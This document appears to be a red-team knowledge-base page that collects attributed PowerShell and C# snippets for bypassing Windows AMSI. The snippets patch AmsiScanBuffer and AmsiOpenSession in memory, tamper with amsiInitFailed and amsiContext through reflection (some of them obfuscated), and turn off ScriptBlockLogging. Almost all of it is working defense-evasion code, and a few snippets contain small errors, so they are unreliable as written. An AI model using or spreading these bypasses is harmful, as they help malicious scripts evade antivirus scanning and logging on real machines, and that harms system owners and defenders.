---
author(s):
  - Userware
tags:
  - malware-development
  - defense-evasion
credits:
  - Matt Graebers
  - Rasta Mouse
  - Am0nSec
  - Adam Chester
  - Cobbr
  - subat0milk
---
# PowerShell

## Matt Graebers

### amsiInitFailed Reflection modification

```powershell
# Author: Matt Graebers

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
```

Obfuscated variant.

```powershell
$a = [Ref].Assembly.GetTypes()

foreach($b in $a) {
    if($b.Name -like "*iUtils") {
        $c = $b
    }
}

$d = $c.GetFields('NonPublic,Static')

foreach($e in $d) {
    if($e.Name -like "*Context") {
        $f = $e
    }
}

$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

Here's an obfuscated one-liner.

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

Another obfuscated variant.

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

### Forcing an error

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession', 'NonPublic,Static').SetValue($null, $null)
```

Another variant.

```powershell
$memory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]$memory)
```

## Rasta Mouse

```powershell
# Author: Rasta Mouse

$Win32API = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out lpflOldProtect);
}
"@
Add-Type $Win32API
$LoadLibrary = [Win32API]::LoadLibrary("amsi.dll")
$Address = [Win32API]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$oldprotect = 0
[Win32API]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$oldprotect)
$Patch = [Byte[]] (0xb8, 0x57, 0x00, 0x80, 0xc3) # E_INVALIDARG
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

## Am0nSec

```powershell
# Author: Am0nSec

$Win32API = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32API

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Win32API]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Win32API]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
    Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Win32API]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$oldprotect = 0
[Win32API]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$oldprotect) | Out-Null
```

## Adam Chester

```powershell
# Adam Chester

$Patch = @"
using System;
using System.Runtime.InteropServices;

public class patch
{
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

    public static void it()
    {
        if (is64Bit())
            PatchAmsi(x64);
        else
            PatchAmsi(x86);
    }

    private static void PatchAmsi(byte[] patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("amsi.dll");
            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
            Console.WriteLine("Patch Sucessfull");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
    {
        bool is64Bit = true;
        
        if (IntPtr.Size == 4)
	        is64Bit = false;

		return is64Bit;  
	}
}

class Win32  
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $Patch -Language CSharp
[patch]::it()
```

## Cobbr

```powershell
# Author: Cobbr

$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
If ($GroupPolicyField) {
    $GroupPolicyCache = $GroupPolicyField.GetValue($null);
    If ($GroupPolicyCache['ScriptBlockLogging']) {
        $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
        $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
    }
    $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
    $val.Add('EnableScriptBlockLogging', 0);
    $val.Add('EnableScriptBlockInvocationLogging', 0);
    $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
};
```

## subat0mik

```powershell
Add-Type $Win32APIs
$Patch = [Byte[]] (0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3)
$LoadLibrary = [Win32APIs]::LoadLibrary("MpOav.dll")
$Address = [Win32APIs]::GetProcAddress($LoadLibrary, "DllGetClassObject")
$oldprotect = 0

[Win32APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$oldprotect)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

$object = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object, $null)
```

### [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Obfuscation/Malware Development/Functions/Windows/Import Address Table/PowerShell|IAT Obfuscation]]

```powershell
function LookupFunc {
	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] ([Convert]::FromBase64String("SDHAAw==")) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
```

---
## References

### Source Repositories

- [S3cur3Th1sSh1t: Amsi Bypass Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

- [Rasta Mouse: AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)

- [mgeeky: Disable-Amsi](https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/Disable-Amsi.ps1)

### Wadcoms

- [Wadcoms: AMSI-Bypass-amsiContext](https://arttoolkit.github.io/wadcoms/AMSI-Bypass-amsiContext/)

### Pentest Laboratories

- [Pentest Laboratories: AMSI Bypass Methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)

### Rasta Mouse

- [Rasta Mouse: Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)

### 0x00

- [0x00: How to Bypass AMSI and Execute ANY Malicious Powershell Code](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)

### InternalAllTheThings

- [InternalAllTheThings: Windows - AMSI Bypass](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-amsi-bypass/)

### RootFu

- [RootFu: Bypassing AMSI with Dynamic API Resolution in PowerShell](https://rootfu.in/bypassing-amsi-with-dynamic-api-resolution-in-powershell/)